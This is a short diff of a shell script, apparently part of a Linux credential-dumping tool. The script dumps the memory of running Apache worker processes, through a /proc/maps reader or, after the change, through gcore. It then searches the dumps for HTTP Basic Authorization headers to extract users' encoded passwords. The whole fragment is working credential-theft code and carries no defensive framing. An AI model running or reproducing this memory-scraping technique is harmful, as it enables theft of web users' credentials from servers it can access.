@@ -18,7 +18,7 @@ dump_pid ()
 {
 	pid=$1
 	output_file=$2
-	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack|deleted' |cut -d" " -f 1 |
+	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' |cut -d" " -f 1 |
 	while read memrange; do
 		memrange_start=`echo $memrange | cut -d"-" -f 1`;
 		memrange_start=`printf "%u\n" 0x$memrange_start`;
@@ -178,7 +178,7 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 	if [[ "$PID" ]];then
 		#Dump all workers
 		while read -r pid; do
-			dump_pid "$pid" /tmp/apache
+			gcore -o /tmp/apache $pid > /dev/null 2>&1
 		done <<< "$PID"
 		#Get encoded creds
 		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
